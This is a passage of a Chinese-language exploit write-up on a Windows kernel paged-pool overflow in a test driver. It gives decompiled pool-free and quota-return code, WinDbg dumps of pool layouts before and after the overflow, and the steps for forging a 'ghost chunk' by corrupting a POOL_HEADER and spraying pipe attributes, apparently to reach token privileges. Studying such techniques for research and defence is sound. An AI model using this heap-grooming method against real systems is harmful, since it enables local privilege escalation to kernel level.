
```
__int64 __fastcall ExFreeHeapPool(ULONG_PTR poolheader){
    int PoolTag = poolheader->PoolTag;
    // PoolType包含PoolQuota（0x8）标志位
    if ( PoolTag & 8 )
    {
        PEPROCESS  proc = (PEPROCESS)((unsigned __int64)poolheader ^ ExpPoolQuotaCookie ^ (_QWORD)poolheader->ProcessBilled);
        // 0x568就是EPROCESS的QuotaBlock字段偏移量
        PspReturnQuota(
            *(char **)(((unsigned __int64)poolheader ^ ExpPoolQuotaCookie ^ (_QWORD)poolheader->ProcessBilled) + 0x568),
            (unsigned __int64)poolheader ^ ExpPoolQuotaCookie ^ (_QWORD)poolheader->ProcessBilled,
            v9 & 1,
            16i64 * (unsigned __int8)*((_WORD *)&poolheader->0 + 1));
    }
}
// valueThunckSize就是pool分配的大小,调试获取的值是0x210,目的的递减进程配额Quota大小减去ChunkSize
unsigned __int64 __fastcall PspReturnQuota(char *QuotaBlock, ULONG_PTR proc, int value8and0, ULONG_PTR valueThunckSize)
{
    _QWORD _RDI_Token_EnabledPresent_Ptr = *(_QWORD *)&QuotaBlock[v6];
    _QWORD Token_EnabledPresent_Value = *(_QWORD *)&QuotaBlock[v6];
    while ( 1 )
    {
        do
        {
            // 如果ChunkSize大于进程配额Quota,直接置零,否则减去ChunkSize
            if ( valueThunckSizeRef >= Token_EnabledPresent_Value )
            {
                lookupValue = Token_EnabledPresent_Value;
                QWORD  Deleta = 0i64;
            }
            else
            {
                lookupValue = valueThunckSize;
                QWORD Deleta = Token_EnabledPresent_Value - valueThunckSize;
            }
            // 如果地址_RDI_Token_EnabledPresent_Ptr指向值等于Token_EnabledPresent_Value修改指向值为Deleta,也就说递减valueThunckSize
            result = _InterlockedCompareExchange(_RDI_Token_EnabledPresent_Ptr, Deleta, Token_EnabledPresent_Value);
            equal = Token_EnabledPresent_Value == result;
            Token_EnabledPresent_Value = result;
        }
        while ( !equal );
    }
}
```

### 调试分析

下面我们通过具体的调试输出验证下漏洞运行的实际结果。笔者使用了 `0x180` 的分页内存区域 pool 大小，在覆盖块被覆盖之前 pool 布局：

```
sxe ld:poolqudong.sys
"bp poolqudong!CommandCopy"
// g_Buffer 指针指向的就是漏洞块的地址ffffad09`df3f8a40
1: kd> !pool poi(g_Buffer)-10;
// ffffad09df3f8a40
DBGHELP: SharedUserData - virtual symbol module
Pool page ffffad09df3f8a40 region is Paged pool
ffffad09df3f80e0 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8270 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8400 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8590 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8720 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f88b0 size: 190 previous size: 0 (Allocated)  NpAt
*ffffad09df3f8a40 size: 190 previous size: 0 (Allocated) *VULN
Owning component : Unknown (update pooltag.txt)
// 下个就是覆盖块
ffffad09df3f8bd0 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8d60 size: 190 previous size: 0 (Allocated)  NpAt
// poi(g_Buffer)+180就是ffffad09df3f8bd0
1: kd> dt nt!_pool_header poi(g_Buffer)+180;
+0x000 PreviousSize     : 0y00000000 (0)
+0x000 PoolIndex        : 0y00000000 (0)
// 漏洞块大小是190
+0x002 BlockSize        : 0y00011001 (0x19)
+0x002 PoolType         : 0y00000011 (0x3)
+0x000 Ulong1           : 0x3190000
+0x004 PoolTag          : 0x7441704e
+0x008 ProcessBilled    : (null)
+0x008 AllocatorBackTraceIndex : 0
+0x00a PoolTagHash      : 0
```

覆盖块被覆盖之后，此时覆盖块已经不能被系统正常识别，它的 `POOL_HEADER` 中 `PreviousSize` 被设置为 `0x15`，并且 `CacheAligned` 置位，覆盖块的地址 ``ffffad09df3f8bd0 - (0x15 * 0x10) = ffffad09`df3f8a80`` 也就是接下来要伪造的幽灵块。

```
// 在trigger_vuln(xploit, overflow, xploit->offset_to_pool_header + 4);执行之后
1: kd> !pool poi(g_Buffer)-10;
Pool page ffffad09df3f8a40 region is Paged pool
ffffad09df3f80e0 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8270 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8400 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8590 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f8720 size: 190 previous size: 0 (Allocated)  NpAt
ffffad09df3f88b0 size: 190 previous size: 0 (Allocated)  NpAt
*ffffad09df3f8a40 size: 190 previous size: 0 (Allocated) *VULN
Owning component : Unknown (update pooltag.txt)
// 覆盖块已经不能被系统正常识别
ffffad09df3f8bd0 doesn't look like a valid small pool allocation, checking to see if the entire page is actually part of a large page allocation...
// 就是覆盖块ffffad09df3f8bd0的POOL_HEADER
1: kd> dt nt!_pool_header poi(g_Buffer)+180 = ffffad09`df3f8bd0;
// PreviousSize被设置为0x15,ffffad09df3f8bd0-(0x15*0x10)就是接下来要伪造的幽灵块
+0x000 PreviousSize     : 0y00010101 (0x15)
+0x000 PoolIndex        : 0y00000000 (0)
+0x002 BlockSize        : 0y00000000 (0)
+0x002 PoolType         : 0y00000100 (0x4)
+0x000 Ulong1           : 0x4000015
// CacheAligned置位,0x7441704e&4!=0
+0x004 PoolTag          : 0x7441704e
+0x008 ProcessBilled    : (null)
+0x008 AllocatorBackTraceIndex : 0
+0x00a PoolTagHash      : 0
1: kd> dc poi(g_Buffer)-10 L100;
 ffffad09`df3f8a40  03190000 4e4c5556 00000000 00000000  ....VULN........
 ffffad09`df3f8a50  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
 ...
 ffffad09`df3f8bc0  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
 ffffad09`df3f8bd0  04000015 7441704e 00000000 00000000  ....NpAt........
 ffffad09`df3f8be0  df8d6ad0 ffffad09 df8d6ad0 ffffad09  .j.......j......
 ffffad09`df3f8bf0  df3f8c08 ffffad09 00000156 00000000  ..?.....V.......
 // ValueSize=0x156, AttributeName是ffffad09`df3f8c08还有AttributeValue是ffffad09`df3f8c0a
 ffffad09`df3f8c00  df3f8c0a ffffad09 4141005a 41414141  ..?.....Z.AAAAAA
 ffffad09`df3f8c10  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
 ffffad09`df3f8c20  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
 ffffad09`df3f8c30  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
 ffffad09`df3f8c40  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
 ffffad09`df3f8c50  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
 ffffad09`df3f8c60  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
spray_pipes(xploit->respray); // 被执行
```

就是接下来要伪造的幽灵块在漏洞块 `+0x30` 的位置，使用一个 `pipe_attribute` 结构体占位，`pipe_attribute->ValueSize=0x1d6+ATTRIBUTE_NAME_LEN` 加上 `sizeof(pipe_attribute)` 也正好是幽灵块的大小 `0x210`。
